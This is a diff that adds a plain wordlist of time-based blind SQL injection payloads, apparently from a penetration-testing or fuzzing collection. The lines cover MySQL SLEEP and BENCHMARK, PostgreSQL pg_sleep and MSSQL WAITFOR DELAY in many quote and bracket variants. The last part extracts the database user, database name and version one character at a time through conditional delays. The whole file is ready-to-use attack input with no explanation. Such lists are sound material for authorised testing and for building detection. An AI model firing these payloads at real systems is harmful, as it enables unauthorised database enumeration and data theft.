@@ -1,0 +1,117 @@
+sleep(10)#
+1 or sleep(10)#
+" or sleep(10)#
+' or sleep(10)#
+" or sleep(10)="
+' or sleep(10)='
+1) or sleep(10)#
+") or sleep(10)="
+') or sleep(10)='
+1)) or sleep(10)#
+")) or sleep(10)="
+')) or sleep(10)='
+;waitfor delay '0:0:10'--
+);waitfor delay '0:0:10'--
+';waitfor delay '0:0:10'--
+";waitfor delay '0:0:10'--
+');waitfor delay '0:0:10'--
+");waitfor delay '0:0:10'--
+));waitfor delay '0:0:10'--
+'));waitfor delay '0:0:10'--
+"));waitfor delay '0:0:10'--
+benchmark(10000000,MD5(10))#
+1 or benchmark(10000000,MD5(10))#
+" or benchmark(10000000,MD5(10))#
+' or benchmark(10000000,MD5(10))#
+1) or benchmark(10000000,MD5(10))#
+") or benchmark(10000000,MD5(10))#
+') or benchmark(10000000,MD5(10))#
+1)) or benchmark(10000000,MD5(10))#
+")) or benchmark(10000000,MD5(10))#
+')) or benchmark(10000000,MD5(10))#
+pg_sleep(10)--
+1 or pg_sleep(10)--
+" or pg_sleep(10)--
+' or pg_sleep(10)--
+1) or pg_sleep(10)--
+") or pg_sleep(10)--
+') or pg_sleep(10)--
+1)) or pg_sleep(10)--
+")) or pg_sleep(10)--
+')) or pg_sleep(10)--
+SELECT BENCHMARK(600000,MD5('A'));
+id=1 OR SLEEP(10)=0 LIMIT 1--
+id=1) OR SLEEP(10)=0 LIMIT 1--
+id=1' OR SLEEP(10)=0 LIMIT 1--
+id=1') OR SLEEP(10)=0 LIMIT 1--
+id=1)) OR SLEEP(10)=0 LIMIT 1--
+id=SELECT SLEEP(10)--
+AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(10)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)#
+SLEEP(10)#
+SLEEP(10)--
+SLEEP(10)="
+SLEEP(10)='
+or SLEEP(10)
+or SLEEP(10)#
+or SLEEP(10)--
+or SLEEP(10)="
+or SLEEP(10)='
+waitfor delay '00:00:10'
+waitfor delay '00:00:10'--
+waitfor delay '00:00:10'#
+benchmark(50000000,MD5(10))
+benchmark(50000000,MD5(10))--
+benchmark(50000000,MD5(10))#
+or benchmark(50000000,MD5(10))
+or benchmark(50000000,MD5(10))--
+or benchmark(50000000,MD5(10))#
+pg_SLEEP(10)
+pg_SLEEP(10)--
+pg_SLEEP(10)#
+or pg_SLEEP(10)
+or pg_SLEEP(10)--
+or pg_SLEEP(10)#
+'\"
+AnD SLEEP(10)
+AnD SLEEP(10)--
+AnD SLEEP(10)#
+&&SLEEP(10)
+&&SLEEP(10)--
+&&SLEEP(10)#
+' AnD SLEEP(10) ANd '1
+'&&SLEEP(10)&&'1
+ORDER BY SLEEP(10)
+ORDER BY SLEEP(10)--
+ORDER BY SLEEP(10)#
+(SELECT * FROM (SELECT(SLEEP(10)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(10)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(10)))ecMj)--
++benchmark(3200,SHA1(10))+'
++ SLEEP(10) + '
+SLEEP(10)/*' or SLEEP(51) or '" or SLEEP(10) or "*/
+,cAsT(chr(126)||pg_sleep(10)||chr(126)+aS+nUmeRiC)
+' and (select*from(select(sleep(10)))a)-- -
+' and if(length(user())=18,(select*from((select 1)a)where sleep(10)),0)-- -
+' and if(substr(user(),1,1)="a",(select*from((select 1)a)where sleep(10)),0)-- -
+' and if(user()="root*",(select*from((select 1)a)where sleep(10)),0)-- -
+' and if(length(database())=3,(select*from((select 1)a)where sleep(10)),0)-- -
+' and if(substr(database(),1,1)="v",(select*from((select 1)a)where sleep(2)),0)-- -
+' and if(database()LIKE"%25vpd%25",(select*from((select 1)a)where sleep(10)),0)-- -
+' and if(length(version())=6,(select*from((select 1)a)where sleep(10)),0)-- -
+' and if(substr(version(),1,1)="5",(select*from((select 1)a)where sleep(10)),0)-- -
+' and if(version()="5.*",(select*from((select 1)a)where sleep(10)),0)--
+' &nbsp;and &nbsp;(select*from(select(sleep(10)))a)-- &nbsp;
+'+(case+when+length(user())=22+then+BENCHMARK(5000000,MD5('A'))+else+0+end)+'
+'+(case+when+substring(user(),1,1)='f'+then+BENCHMARK(5000000,MD5('A'))+else+0+end)
+'+(case+when+substring(user(),2,1)='-'+then+BENCHMARK(5000000,MD5('A'))+else+0+end)+'
+'+(case+when+user()LIKE"%25f-_c__a_1_____________%25"+then+BENCHMARK(5000000,MD5('A'))+else+0+end)+'
+'+(case+when+length(database())=17+then+BENCHMARK(5000000,MD5('A'))+else+0+end)+'
+'+(case+when+substring(database(),1,1)='m'+then+BENCHMARK(5000000,MD5('A'))+else+0+end)+'
+'+(case+when+database()LIKE"%25Mariadbconnection%25"+then+BENCHMARK(5000000,MD5('A'))+else+0+end)+'
+'+(case+when+length(version())=19+then+BENCHMARK(5000000,MD5('A'))+else+0+end)+'
+'+(case+when+substring(version(),1,1)='m'+then+BENCHMARK(5000000,MD5('A'))+else+0+end)+'
+'+(case+when+version()LIKE"%2510.3.13-mariadb-log%25"+then+BENCHMARK(5000000,MD5('A'))+else+0+end)+'
